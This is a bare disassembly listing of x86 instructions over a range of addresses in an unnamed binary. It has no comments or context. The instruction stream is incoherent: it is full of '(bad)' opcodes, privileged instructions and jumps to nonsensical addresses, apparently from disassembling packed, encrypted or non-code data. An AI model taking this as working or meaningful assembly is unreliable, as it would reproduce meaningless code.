  419c6e:	fist   DWORD PTR [edi-0x369672d9]
  419c74:	mov    BYTE PTR [ecx],al
  419c76:	ror    DWORD PTR [esi+0x23],1
  419c79:	dec    esp
  419c7a:	in     al,0x70
  419c7c:	cs mov bh,0xf2
  419c7f:	cmp    dh,al
  419c81:	das    
  419c82:	cmp    eax,0xca7f18da
  419c87:	mov    ebp,0x2287d322
  419c8c:	js     0x419c50
  419c8e:	mov    bl,0xd
  419c90:	xchg   ebp,eax
  419c91:	into   
  419c92:	add    dl,dh
  419c94:	js     0x419ce8
  419c96:	shl    BYTE PTR ds:0x3b5d35e1,1
  419c9c:	imul   ebx,esi,0xe0d93d1
  419ca2:	xchg   ebx,eax
  419ca3:	loopne 0x419d22
  419ca5:	cdq    
  419ca6:	cmp    ecx,DWORD PTR [edx-0x44d38184]
  419cac:	mov    edi,0x225fde5
  419cb1:	pop    ds
  419cb2:	push   cs
  419cb3:	inc    esi
  419cb4:	adc    dl,BYTE PTR [ecx+0x53]
  419cb7:	fadd   st,st(5)
  419cb9:	sbb    eax,0x2de2cbef
  419cbe:	sub    DWORD PTR [edi+0x7f],ebp
  419cc1:	or     ebx,edi
  419cc3:	dec    ebx
  419cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cc5:	cld    
  419cc6:	dec    ebp
  419cc7:	mov    bl,0xaa
  419cc9:	rol    BYTE PTR [ecx+0x69c0420a],cl
  419ccf:	sbb    al,0xc9
  419cd1:	je     0x419cf2
  419cd3:	jb     0x419cb8
  419cd5:	inc    ebp
  419cd6:	pop    eax
  419cd7:	neg    edi
  419cd9:	gs jp  0x419d34
  419cdc:	in     al,0x67
  419cde:	fbstp  TBYTE PTR [edx-0x6c5b6efb]
  419ce4:	add    eax,0x72c3bb4e
  419ce9:	xchg   ecx,eax
  419cea:	repnz pop edi
  419cec:	add    eax,0xff77f828
  419cf1:	xor    eax,0xe91b1891
  419cf6:	rol    BYTE PTR [ebx],cl
  419cf8:	adc    edi,DWORD PTR [ecx]
  419cfa:	xor    bp,WORD PTR [eax+edx*1-0x739a08a2]
  419d02:	bound  ecx,QWORD PTR [ebx-0x6d]
  419d05:	arpl   WORD PTR [ecx+0x2da89b7a],di
  419d0b:	lea    edx,[eax+0x54]
  419d0e:	cs inc esi
  419d10:	ret    
  419d11:	dec    eax
  419d12:	pop    ss
  419d13:	ror    WORD PTR [ecx],cl
  419d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d17:	cmp    al,BYTE PTR [eax-0x22]
  419d1a:	ins    BYTE PTR es:[edi],dx
  419d1b:	or     esi,esp
  419d1d:	jecxz  0x419d4f
  419d1f:	ficom  WORD PTR [eax]
  419d21:	jmp    0x2d3a384c
  419d26:	(bad)  
  419d28:	pop    edx
  419d29:	mov    DWORD PTR [eax+0x563ed7e2],ecx
  419d2f:	popf   
  419d30:	jmp    0xfc541a32
  419d35:	xor    edi,ebp
  419d37:	pop    es
  419d38:	(bad)  
  419d39:	cdq    
  419d3a:	stos   DWORD PTR es:[edi],eax
  419d3b:	in     al,dx
  419d3c:	dec    ebx
  419d3d:	mov    ebp,0xa3a65c62
  419d42:	cwde   
  419d43:	call   0x43046e32
  419d48:	pop    ds
  419d49:	push   esp
  419d4a:	pop    ecx
  419d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d4c:	push   esi
  419d4d:	dec    esp
  419d4e:	hlt    
  419d4f:	adc    ah,BYTE PTR [ecx]
  419d51:	popf   
  419d52:	pop    edx
  419d53:	enter  0xafd6,0xe6
  419d57:	jle    0x419dce
  419d59:	ror    BYTE PTR [ecx],cl
  419d5b:	xchg   esp,eax
  419d5c:	setle  BYTE PTR [edi-0x4b]
  419d60:	sub    BYTE PTR [ebp-0x69],ch
  419d63:	cmc    
  419d64:	daa    
  419d65:	test   BYTE PTR [edx+0x65858a68],al
  419d6b:	(bad)  
  419d6c:	call   0x8ed4caaa
  419d71:	loope  0x419d33
  419d73:	les    esp,FWORD PTR [bp+di+0x2a]
  419d77:	dec    edi
  419d78:	or     eax,edi
  419d7a:	enter  0x9a20,0x5c
  419d7e:	pop    esp
  419d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d80:	adc    DWORD PTR [ecx+ecx*1],eax
  419d83:	dec    edx
  419d84:	data16 repz and BYTE PTR [esp+ebx*4-0x76],0x8f
  419d8b:	jnp    0x419d0d
  419d8d:	popa   
  419d8e:	outs   dx,DWORD PTR cs:[esi]
  419d90:	push   0x32
  419d92:	mov    ax,ds:0x99594624
  419d98:	fld    QWORD PTR [edx]
  419d9a:	push   ebx
  419d9b:	nop
  419d9c:	lods   eax,DWORD PTR ds:[esi]
  419d9d:	pop    ss
  419d9e:	mov    ds:0xc9bb1fc6,eax
  419da3:	fld    TBYTE PTR [ecx]
  419da5:	hlt    
  419da6:	or     eax,0x42ec79dd
  419dab:	data16 loop 0x419dbd
  419dae:	and    ch,BYTE PTR [ecx]
  419db0:	ror    BYTE PTR [esi-0x7d],0x85
  419db4:	shl    DWORD PTR [eax+0x1a],0x9a
  419db8:	stos   BYTE PTR es:[edi],al
  419db9:	adc    eax,0x9bdf8578
  419dbe:	inc    ebp
  419dbf:	or     edx,DWORD PTR [ecx-0x35]
  419dc2:	cmc    
  419dc3:	jns    0x419e3c
  419dc5:	mov    ecx,0x96cde369
  419dca:	sahf   
  419dcb:	jmp    0x3fd06480
  419dd0:	je     0x419df5
  419dd2:	(bad)  
  419dd3:	repnz aaa 
  419dd5:	lods   eax,DWORD PTR ds:[esi]
  419dd6:	fstp   DWORD PTR [edi+0x4b79a5]
  419ddc:	iret   
  419ddd:	test   al,0xfa
  419ddf:	scas   eax,DWORD PTR es:[edi]
  419de0:	sar    BYTE PTR [esi-0x1d],0x64
  419de4:	push   esp
  419de5:	mov    WORD PTR [ebx],es
  419de7:	jo     0x419dc6
  419de9:	mov    ebx,0xae235e39
  419dee:	daa    
  419def:	or     edi,0xffffff80
  419df2:	push   ebp
  419df3:	sbb    ebx,edi
  419df5:	cdq    
  419df6:	or     bl,BYTE PTR [ecx-0x4d]
  419df9:	inc    ebp
  419dfa:	jg     0x419e22
  419dfc:	imul   ebx,esp,0xffffffa9
  419dff:	rol    DWORD PTR [esi-0x312f865b],1
  419e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e06:	add    BYTE PTR [esi],dl
  419e08:	ins    BYTE PTR es:[edi],dx
  419e09:	adc    edx,edx
  419e0b:	pop    ss
  419e0c:	aam    0xa7
  419e0e:	push   edx
  419e0f:	icebp  
  419e10:	(bad)  
  419e11:	mov    ds:0x43291a72,eax
  419e16:	sbb    BYTE PTR [edx],dh
  419e18:	xchg   BYTE PTR [edx-0x4c],cl
  419e1b:	test   ah,ch
  419e1d:	push   edi
  419e1e:	jae    0x419e71
  419e20:	cdq    
  419e21:	(bad)  
  419e22:	cmc    
  419e23:	sbb    eax,0x22e662a9
  419e28:	into   
  419e29:	rol    DWORD PTR [edi+0x2e7af0],0x29
  419e30:	dec    ecx
  419e31:	in     al,0x39
  419e33:	out    0x63,eax
  419e35:	mov    WORD PTR [esi],?
  419e37:	mov    esi,0x946be926
  419e3c:	pop    ss
  419e3d:	(bad)  
  419e3e:	repnz ror DWORD PTR [ebp+0x73bfcb94],cl
  419e45:	int3   
  419e46:	hlt    
  419e47:	shr    BYTE PTR ds:0xfa1b844d,1
  419e4d:	sbb    eax,0x7b1ce072
  419e52:	adc    al,0x1e
  419e54:	and    al,0x5e
  419e56:	mov    dl,0xc8
  419e58:	clc    
  419e59:	ins    BYTE PTR es:[edi],dx
  419e5a:	hlt    
  419e5b:	mov    WORD PTR [esi],ds
  419e5d:	pushf  
  419e5e:	in     eax,0x4f
  419e60:	scas   eax,DWORD PTR es:[edi]
  419e61:	pop    eax
  419e62:	pop    ebp
  419e63:	dec    ecx
  419e64:	pop    esp
  419e65:	xor    eax,0xfcf3f786
  419e6a:	xchg   BYTE PTR [esi-0x75],dh
  419e6d:	cdq    
  419e6e:	loopne 0x419e93
  419e70:	imul   edi,ecx,0xfa80df15
  419e76:	inc    esp
  419e77:	fs out dx,al
  419e79:	std    
  419e7a:	stc    
  419e7b:	bound  edi,QWORD PTR [eax+0x3694a9b3]
  419e81:	xor    eax,0x51c9afa7
  419e86:	jnp    0x419e86
  419e88:	not    bh
  419e8a:	in     al,dx
  419e8b:	xlat   BYTE PTR ds:[ebx]
  419e8c:	cmp    eax,0xdea80e16
  419e91:	repnz nop
  419e93:	or     al,0xac
  419e95:	adc    eax,0x68a15815
  419e9a:	int    0x1
  419e9c:	je     0x419e85
  419e9e:	fidiv  DWORD PTR [esi-0x3a748962]
  419ea4:	mov    dl,0x63
  419ea6:	ret    0xfb9
  419ea9:	xor    eax,0x855b8630
  419eae:	test   BYTE PTR [edi-0x38],bh
  419eb1:	jecxz  0x419e79
  419eb3:	mov    WORD PTR [edi-0x53],?
  419eb6:	cdq    
  419eb7:	leave  
  419eb8:	int3   
  419eb9:	dec    edx
  419eba:	aaa    
  419ebb:	push   ds
  419ebc:	mov    ds:0xf60bb7b8,al
  419ec1:	lds    edi,FWORD PTR [edi+0x422375aa]
  419ec7:	rcl    DWORD PTR [ebx-0x4b1a6be4],0x8d
  419ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ecf:	add    ecx,DWORD PTR [ecx-0x2e]
  419ed2:	test   BYTE PTR [edi-0x7e],dh
  419ed5:	mov    eax,0x53fdf63b
  419eda:	or     al,0xfa
  419edc:	xor    al,bl
  419ede:	rcl    DWORD PTR [ebp-0x11],1
  419ee1:	test   DWORD PTR [ecx+edi*8],ebx
  419ee4:	pop    ss
  419ee5:	push   cs
  419ee6:	icebp  
  419ee7:	xor    al,0xf4
  419ee9:	js     0x419f32
  419eeb:	pop    eax
  419eec:	jecxz  0x419ee4
  419eee:	stc    
  419eef:	cmp    al,0x37
  419ef1:	push   ss
  419ef2:	adc    eax,0x9d36221e
  419ef7:	jp     0x419f18
  419ef9:	mov    DWORD PTR [eax+0x62],esi
  419efc:	ds push es
  419efe:	mov    esi,esp
  419f00:	cmp    al,0x95
  419f02:	fmul   DWORD PTR [ecx+0x4e09dae8]
  419f08:	scas   eax,DWORD PTR es:[edi]
  419f09:	xchg   edx,eax
  419f0a:	sbb    esi,edi
  419f0c:	push   cs
  419f0d:	adc    eax,0x42cf88eb
  419f12:	cwde   
  419f13:	ret    0x1b2b
  419f16:	push   ss
  419f17:	jae    0x419ef6
  419f19:	stos   DWORD PTR es:[edi],eax
  419f1a:	mov    cs,edx
  419f1c:	cwde   
  419f1d:	(bad)  
  419f1e:	lock xchg ecx,eax
  419f20:	test   dh,0x8c
  419f23:	push   eax
  419f24:	int    0xea
  419f26:	sub    cl,0x4b
  419f29:	and    DWORD PTR [esp+eiz*2-0x73],0xffffffc9
  419f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f2f:	add    cl,BYTE PTR [ebx+0xf049c06]
  419f35:	lods   al,BYTE PTR ds:[esi]
  419f36:	daa    
  419f37:	xor    bh,BYTE PTR [eax-0x5d]
  419f3a:	sub    BYTE PTR [esi],ah
  419f3c:	sti    
  419f3d:	ins    DWORD PTR es:[edi],dx
  419f3e:	call   0xd760:0x34728dbc
  419f45:	ret    
  419f46:	jbe    0x419f77
  419f48:	ins    BYTE PTR es:[edi],dx
  419f49:	sub    DWORD PTR [ebx-0x30],ebx
  419f4c:	int    0xf8
  419f4e:	inc    ebx
  419f4f:	sub    al,0x57
  419f51:	mov    ecx,0x298f134f
  419f56:	test   eax,0xad1d15ce
  419f5b:	outs   dx,DWORD PTR ds:[esi]
  419f5c:	and    DWORD PTR [eax-0x780f6989],ebp
  419f62:	jmp    0x419f59
  419f64:	xchg   DWORD PTR [edi+0x67],esp
  419f67:	mov    al,0x42
  419f69:	stc    
  419f6a:	les    ebp,FWORD PTR [edx-0x25]
  419f6d:	push   edi
  419f6e:	sbb    esp,esp
  419f70:	leave  
  419f71:	jecxz  0x419efa
  419f73:	sar    ch,0xdc
  419f76:	call   DWORD PTR [edx]
  419f78:	aad    0xff
  419f7a:	test   BYTE PTR [ecx+0x35],bh
  419f7d:	call   0xed8c:0xce51ffa8
  419f84:	xchg   ebp,eax
  419f85:	daa    
  419f86:	pop    esi
  419f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f88:	sbb    eax,0x3125419f
  419f8d:	mov    bl,0xe8
  419f8f:	(bad)  
  419f90:	mov    ch,0x29
  419f92:	cmp    dl,BYTE PTR cs:0x6eb9d7bc
  419f99:	ins    DWORD PTR es:[edi],dx
  419f9a:	out    dx,al
  419f9b:	leave  
  419f9c:	(bad)  
  419f9d:	jno    0x419f68
  419f9f:	imul   edi,DWORD PTR [edx+0x40],0xa5ffb2f2
  419fa6:	nop
  419fa7:	push   ss
  419fa8:	lea    eax,[edx-0x33]
  419fab:	jo     0x9f7293c4
  419fb1:	outs   dx,BYTE PTR ds:[esi]
  419fb2:	and    edx,DWORD PTR [edx+0x7d1f5e44]
  419fb8:	retf   0xb72e
  419fbb:	jmp    0x5ce5:0xd246b6a3
  419fc2:	inc    esp
  419fc3:	sub    BYTE PTR [edi+0x71ca68ef],dh
  419fc9:	scas   al,BYTE PTR es:[edi]
  419fca:	iret   
  419fcb:	or     ebx,DWORD PTR [esi+0x5438c0b8]
  419fd1:	mov    ah,0x6c
  419fd3:	dec    edx
  419fd4:	icebp  
  419fd5:	xchg   ebp,eax
  419fd6:	nop
  419fd7:	xchg   edi,eax
  419fd8:	adc    ah,BYTE PTR [edx-0x509d8509]
  419fde:	pop    esp
  419fdf:	stos   DWORD PTR es:[edi],eax
  419fe0:	jno    0x419fb0
  419fe2:	adc    dl,ah
  419fe4:	jo     0x41a018
  419fe6:	jl     0x41a024
  419fe8:	sbb    al,0xc1
  419fea:	ret    
  419feb:	add    BYTE PTR fs:[edi-0x43],0xe8
  419ff0:	ins    DWORD PTR es:[edi],dx
  419ff1:	mov    al,0x27
  419ff3:	xor    eax,0x2ff834c1
  419ff8:	jbe    0x41a027
  419ffa:	mov    fs,WORD PTR [eax+edx*1]
  419ffd:	xchg   ebp,eax
  419ffe:	stc    
  419fff:	test   BYTE PTR [edi+0x295bc5ba],ch
  41a005:	push   eax
  41a006:	outs   dx,BYTE PTR ds:[esi]
  41a007:	and    ah,ah
  41a009:	dec    ecx
  41a00a:	ss stos BYTE PTR es:[edi],al
  41a00c:	aam    0x0
  41a00e:	inc    edx
  41a00f:	outs   dx,BYTE PTR ds:[esi]
  41a010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a011:	add    BYTE PTR [ebp-0x11e3de80],dl
  41a017:	call   0x8f0a26db
  41a01c:	cmp    al,0xe4
  41a01e:	add    al,0xfc
  41a020:	xor    edx,ecx
  41a022:	adc    BYTE PTR [esi+0x3c895603],cl
  41a028:	loope  0x419fac
  41a02a:	and    cl,ch
  41a02c:	jg     0x41a01f
  41a02e:	pop    ebp
  41a02f:	lahf   
  41a030:	pop    ebp
  41a031:	mov    ah,0x31
  41a033:	imul   edx,DWORD PTR [edi-0x47cabc7],0xbad58f37
  41a03d:	mov    al,0x94
  41a03f:	or     eax,0xa9aa30b4
  41a044:	xor    dl,BYTE PTR [ebp-0x1bb921a8]
  41a04a:	mov    eax,0x382bb908
  41a04f:	lods   eax,DWORD PTR ds:[esi]
  41a050:	ins    BYTE PTR es:[edi],dx
  41a051:	cmc    
  41a052:	popf   
  41a053:	and    BYTE PTR [esi],al
  41a055:	mov    ch,0x66
  41a057:	sbb    DWORD PTR [ebp+0x54],esi
  41a05a:	in     al,dx
  41a05b:	in     al,dx
  41a05c:	aad    0x2e
  41a05e:	jl     0x41a01b
  41a060:	daa    
  41a061:	shl    BYTE PTR [ebx],1
  41a063:	sbb    edx,DWORD PTR [ebx-0x1c]
  41a066:	push   0x187e34e
  41a06b:	xor    BYTE PTR [esi],ah
  41a06d:	(bad)  
  41a06e:	in     al,0x28
  41a070:	in     eax,dx
  41a071:	and    al,0xdb
  41a073:	pop    ecx
  41a075:	and    al,0x0
  41a077:	cmp    al,0xb5
  41a079:	cs das 
  41a07b:	in     eax,dx
  41a07c:	inc    ecx
  41a07d:	mov    esp,DWORD PTR [edx]
  41a07f:	and    esp,DWORD PTR [esi+edx*4+0x23ccef01]
  41a086:	cmp    al,al
  41a088:	mov    dh,0x70
  41a08a:	and    al,0xb3
  41a08c:	mov    ch,0xd3
  41a08e:	push   ds
  41a08f:	gs xchg ebx,eax
  41a091:	mov    BYTE PTR [esi-0x3b],0xb0
  41a095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a096:	pushf  
  41a097:	sub    DWORD PTR [ebx],0x4e
  41a09a:	and    esp,ebx
  41a09c:	sub    al,0x5e
  41a09e:	stos   BYTE PTR es:[edi],al
  41a09f:	fild   WORD PTR [edx+0x26]
  41a0a2:	or     DWORD PTR ds:0x4a588396,edi
  41a0a8:	cmp    ebp,DWORD PTR [ebp-0x4deddc68]
  41a0ae:	(bad)  
  41a0af:	cs pushf 
  41a0b1:	loop   0x41a0c2
  41a0b3:	aam    0x3f
  41a0b5:	aaa    
  41a0b6:	mov    dh,0xff
  41a0b8:	scas   al,BYTE PTR es:[edi]
  41a0b9:	jl     0x41a072
  41a0bb:	(bad)  
  41a0bc:	xchg   ecx,eax
  41a0bd:	add    al,0x39
  41a0bf:	jp     0x41a073
  41a0c1:	push   0x6c
  41a0c3:	jle    0x41a11c
  41a0c5:	in     al,0x15
  41a0c7:	(bad)  [eax-0x68]
  41a0ca:	call   0xbd38:0x62b0823e
  41a0d1:	mov    ds:0x1573246e,eax
  41a0d6:	in     al,0x71
  41a0d8:	les    ebx,FWORD PTR [ecx-0x2720d9b7]
  41a0de:	push   ecx
  41a0df:	sar    DWORD PTR [eax+0x14f3e05b],1
  41a0e5:	sbb    dl,ch
  41a0e7:	ins    BYTE PTR es:[edi],dx
  41a0e8:	xor    al,BYTE PTR [ebp+0x5c]
  41a0eb:	clc    
  41a0ec:	ins    DWORD PTR es:[edi],dx
  41a0ed:	push   eax
  41a0ef:	cmp    DWORD PTR [ecx+0x7c],edi
  41a0f2:	xor    edx,ecx
  41a0f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0f5:	push   esi
  41a0f6:	or     BYTE PTR [edx-0x1c5e9200],0x2d
  41a0fd:	sbb    ebp,ebp
  41a0ff:	inc    esi
  41a100:	and    al,0xf0
  41a102:	fnstenv [ebx-0x4dd38800]
  41a108:	pop    edi
  41a109:	add    esp,eax
  41a10b:	mov    dh,0x9b
  41a10d:	or     ch,BYTE PTR [eax-0x21]
  41a110:	arpl   WORD PTR [edi+0x4b67deb5],ax
  41a116:	xor    eax,0x45cf7f8
  41a11b:	lods   al,BYTE PTR ds:[esi]
  41a11c:	adc    BYTE PTR [ecx+0x666974f],bl
  41a122:	cld    
  41a123:	std    
  41a124:	jg     0x41a16b
  41a126:	fldcw  WORD PTR [edi]
  41a128:	xor    eax,0xaba89d9f
  41a12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a12e:	test   DWORD PTR [eax+0x1944f15d],edi
  41a134:	stc    
  41a135:	push   ebx
  41a136:	in     eax,0xa
  41a138:	retf   0xc22f
  41a13b:	mov    eax,0xd4ad71a1
  41a140:	pop    ebx
  41a141:	adc    ecx,edi
  41a143:	shr    dl,1
  41a145:	xor    ebx,DWORD PTR [eax-0x2d580906]
  41a14b:	adc    cl,al
  41a14d:	or     esi,esp
  41a14f:	imul   esp,DWORD PTR [edx],0xffffffe7
  41a152:	jge    0x41a1c9
  41a154:	mov    ecx,0xc8aca2ba
  41a159:	or     eax,0xe5a170d
  41a15e:	icebp  
  41a15f:	fstp   QWORD PTR [esi-0x5c]
  41a162:	je     0x41a199
  41a164:	push   edx
  41a165:	or     dl,dh
  41a167:	and    ebx,DWORD PTR [ecx+ecx*4+0x6313cd18]
  41a16e:	push   edx
  41a16f:	push   ebp
  41a170:	push   es
  41a171:	sub    BYTE PTR [ecx+0x62],0xd1
  41a175:	mov    dh,0x23
  41a177:	xchg   eax,ecx
  41a179:	mov    edx,0x5b670e0f
  41a17e:	push   es
  41a17f:	sbb    DWORD PTR [edi+0x2e],esp
  41a182:	and    ecx,ebp
  41a184:	js     0x41a1df
  41a186:	ds push esi
  41a188:	and    eax,0xc4492a34
  41a18d:	(bad)
  41a191:	pop    ss
  41a192:	sub    BYTE PTR [eax],0x6
  41a195:	call   0xff3d6831
  41a19a:	push   eax
  41a19b:	mov    dl,0xde
  41a19d:	iret   
  41a19e:	xlat   BYTE PTR ds:[ebx]
  41a19f:	nop
  41a1a0:	(bad)  
  41a1a1:	repz shr BYTE PTR [edx-0x7d1abf93],0xd1
  41a1a9:	pop    edi
  41a1aa:	adc    esi,DWORD PTR [ebp+0x3d]
  41a1ad:	ins    DWORD PTR es:[edi],dx
  41a1ae:	fwait
  41a1af:	rcl    edi,0x48
  41a1b2:	mov    edx,0xa884ac93
  41a1b7:	add    DWORD PTR [edi],ebp
  41a1b9:	xchg   esi,eax
  41a1ba:	pop    esp
  41a1bb:	pop    esi
  41a1bc:	xchg   ebx,eax
  41a1bd:	push   esp
  41a1be:	leave  
  41a1bf:	jg     0x41a183
  41a1c1:	jmp    0x2a72:0x4556c709
  41a1c8:	sbb    dh,dh
  41a1ca:	daa    
  41a1cb:	inc    edi
  41a1cc:	not    DWORD PTR [edx]
  41a1ce:	sub    bl,dl
  41a1d0:	les    esi,FWORD PTR [esi]
  41a1d2:	outs   dx,BYTE PTR ds:[esi]
  41a1d3:	mov    cl,0x87
  41a1d5:	xchg   esi,eax
  41a1d6:	(bad)  
  41a1d7:	shr    DWORD PTR ds:0x82c78f3c,1
  41a1dd:	(bad)  
  41a1de:	dec    esi
  41a1df:	and    eax,0xb7230e27
  41a1e4:	xor    BYTE PTR [edi+0x46],dh
  41a1e7:	pop    ebx
  41a1e8:	add    bh,cl
  41a1ea:	lds    edi,FWORD PTR [edx-0x6e]
  41a1ed:	or     BYTE PTR [esi],bl
  41a1ef:	sbb    esp,DWORD PTR [esi-0x5875b636]
  41a1f5:	mov    eax,ds:0x3c694826
  41a1fa:	shr    BYTE PTR [ecx+edi*4],1
  41a1fd:	shr    edx,0x93
  41a200:	int3   
  41a201:	mov    cl,0x24
  41a203:	fidiv  DWORD PTR [eax+esi*8+0x53]
  41a207:	shr    BYTE PTR [esi+ebp*2],1
  41a20a:	mov    bh,BYTE PTR [edi-0xc22f646]
  41a210:	test   BYTE PTR [edi-0x66],dl
  41a213:	and    eax,0x9a71fbcb
  41a218:	inc    esp
  41a219:	mov    al,ds:0x13d139ad
  41a21e:	fsubr  DWORD PTR [edx-0x6e]
  41a221:	pop    ebx
  41a222:	pop    ebp
  41a223:	and    eax,0x24814bbf
  41a228:	dec    edx
  41a229:	rcl    edx,0xa6
  41a22c:	push   eax
  41a22d:	jb     0x41a20d
  41a22f:	popa   
  41a230:	mov    ch,0x34
  41a232:	or     BYTE PTR [eax+0x1458f361],dl
  41a238:	sub    eax,0xb0b9f0a7
  41a23d:	dec    ebx
  41a23e:	xchg   edi,eax
  41a23f:	int3   
  41a240:	retf   
  41a241:	push   ebx
  41a242:	retf   
  41a243:	je     0x41a250
  41a245:	xchg   edi,eax
  41a246:	adc    esi,ebx
  41a248:	mov    ch,BYTE PTR [edi-0x74ddff26]
  41a24e:	cli    
  41a24f:	push   ss
  41a250:	push   esp
  41a251:	push   esi
  41a252:	sbb    esp,DWORD PTR [ebp-0x244df76]
  41a258:	pusha  
  41a259:	adc    eax,0x8b474f60
  41a25e:	jno    0x41a1f3
  41a260:	in     al,dx
  41a261:	rcr    DWORD PTR [edx+0x7],0xa1
  41a265:	mov    ebx,0xdd8bfd33
  41a26a:	ret    0xd928
  41a26d:	pop    ebx
  41a26e:	sahf   
  41a26f:	inc    esp
  41a270:	lock ja 0x41a266
  41a273:	ror    BYTE PTR [ebx*8-0x7db318ec],cl
  41a27a:	adc    bh,BYTE PTR [esi+0x68b14e88]
  41a280:	inc    eax
  41a281:	jne    0x41a27f
  41a283:	(bad)  
  41a285:	sub    edi,DWORD PTR [ebx+0x28b81897]
  41a28b:	jbe    0x41a211
  41a28d:	xchg   edx,eax
  41a28e:	rcl    DWORD PTR [ebx],1
  41a290:	xor    al,0x93
  41a292:	xor    BYTE PTR [ebx-0x70],dl
  41a295:	pop    edx
  41a296:	dec    ebp
  41a297:	test   al,0x7a
  41a299:	sub    al,0xb9
  41a29b:	loopne 0x41a27b
  41a29d:	sbb    al,0xf2
  41a29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2a0:	out    dx,eax
  41a2a1:	mov    cl,0x93
  41a2a3:	adc    al,0x35
  41a2a5:	xchg   ebx,eax
  41a2a6:	test   BYTE PTR [eax],bh
  41a2a8:	mov    ch,0x80
  41a2aa:	fistp  QWORD PTR [ebp+0x2ae10eab]
  41a2b0:	inc    ebp
  41a2b1:	lock pop es
  41a2b3:	xor    al,0x96
  41a2b5:	xchg   ebp,eax
  41a2b6:	dec    eax
  41a2b7:	jno    0x41a313
  41a2b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ba:	xor    BYTE PTR [ebx-0x7abe423f],ch
  41a2c0:	jne    0x41a2d3
  41a2c2:	and    DWORD PTR [edx+eiz*8+0x24],0xffffffd1
  41a2c7:	push   ebx
  41a2c8:	cmp    al,0xd8
  41a2ca:	loopne 0x41a311
  41a2cc:	adc    DWORD PTR [ebp-0x168ec4b9],0x1f
  41a2d3:	pushf  
  41a2d4:	leave  
  41a2d5:	call   0x1415f5f3
  41a2da:	cmp    al,0x30
  41a2dc:	aas    
  41a2dd:	in     eax,dx
  41a2de:	inc    eax
  41a2df:	cmp    DWORD PTR ds:0xbc1e47ff,0xfffffffa
  41a2e6:	stos   DWORD PTR es:[edi],eax
  41a2e7:	pop    ecx
  41a2e8:	fbstp  TBYTE PTR [esi+0x700abb38]
  41a2ee:	xchg   edi,eax
  41a2ef:	add    eax,0x834e7ed5
  41a2f4:	jae    0x41a2d1
  41a2f6:	mov    ecx,DWORD PTR [esi+0x7f]
  41a2f9:	arpl   WORD PTR [edi+0x388e70f9],dx
  41a2ff:	repnz cbw 
  41a302:	mov    ecx,0x5267280e
  41a307:	cmc    
  41a308:	fbld   TBYTE PTR [edx-0x1d]
  41a30b:	add    BYTE PTR [ebp-0x4c],cl
  41a30e:	dec    ecx
  41a30f:	add    al,0x63
  41a311:	(bad)  
  41a312:	psrld  mm7,mm2
  41a315:	push   eax
  41a316:	mov    dl,0xa9
  41a318:	dec    eax
  41a319:	mov    bh,0x9d
  41a31b:	pop    es
  41a31c:	lds    eax,FWORD PTR [ebp+0x531c61fd]
  41a322:	fnsave [ecx+0x632c25ca]
  41a328:	fsub   QWORD PTR [esp+edi*8]
  41a32b:	push   eax
  41a32c:	sti    
  41a32d:	retf   0x5285
  41a330:	mov    edi,0xd8c1de3f
  41a335:	lea    ecx,[esi]
  41a337:	aam    0x33
  41a339:	sar    DWORD PTR [esi-0xb89e25b],cl
  41a33f:	ins    DWORD PTR es:[edi],dx
  41a340:	dec    edi
  41a341:	cmp    ebp,edi
  41a343:	pop    ss
  41a344:	add    dh,cl
  41a346:	ins    BYTE PTR es:[edi],dx
  41a347:	mov    ecx,0x582fbc63
  41a34d:	and    bl,dl
  41a34f:	mov    BYTE PTR [eax],bl
  41a351:	enter  0xafbf,0x9b
  41a355:	add    bl,BYTE PTR [esi-0x19]
  41a358:	xlat   BYTE PTR ds:[ebx]
  41a359:	sub    BYTE PTR [ebx],bh
  41a35b:	sbb    eax,0xe135e9b5
  41a360:	jmp    0x41a341
  41a362:	sub    eax,0x17b978c1
  41a367:	loopne 0x41a3da
  41a369:	inc    ebp
  41a36a:	(bad)  
  41a36b:	loop   0x41a394
  41a36d:	push   esp
  41a36e:	and    edi,DWORD PTR [esi]
  41a370:	mov    al,ds:0x34ef2c18
  41a375:	mov    bh,0x92
  41a377:	add    DWORD PTR [esi+esi*8-0x43],0xe32ef792
  41a37f:	push   0x52267831
  41a384:	xchg   ecx,eax
  41a385:	jnp    0x41a348
  41a387:	cmp    DWORD PTR ds:0x8334a563,ebx
  41a38d:	retf   
  41a38e:	mov    eax,ds:0xdcb28cc4
  41a393:	aad    0x7d
  41a395:	pop    ecx
  41a396:	mov    eax,0xfe5e47f5
  41a39b:	dec    edx
  41a39d:	fbstp  TBYTE PTR [edx+0xf0f803]
  41a3a3:	test   eax,0x610f4d31
  41a3a8:	ins    DWORD PTR es:[edi],dx
  41a3a9:	xor    DWORD PTR [ecx+0x3560d734],0x68
  41a3b0:	repnz mov cl,0xbd
  41a3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3b4:	adc    BYTE PTR [edi],0xd0
  41a3b7:	iret   
  41a3b8:	push   0x44189120
  41a3bd:	je     0x41a418
  41a3bf:	and    bl,BYTE PTR [ecx-0x4d]
  41a3c2:	xor    eax,0x80d2cce5
  41a3c7:	in     eax,0xdc
  41a3c9:	lock sbb al,0x5
  41a3cc:	push   ss
  41a3cd:	mov    esi,0x5f87bf34
  41a3d2:	mov    bh,BYTE PTR [ecx-0x7c2b8385]
  41a3d8:	daa    
  41a3d9:	(bad)  
  41a3da:	mov    edx,0xeb572aeb
  41a3df:	xchg   esi,eax
  41a3e0:	jns    0x41a3c7
  41a3e2:	mov    edi,0xd3578f3f
  41a3e7:	xchg   ch,ah
  41a3e9:	outs   dx,DWORD PTR ds:[esi]
  41a3ea:	mov    esp,0xf45ce3f8
  41a3ef:	push   ebp
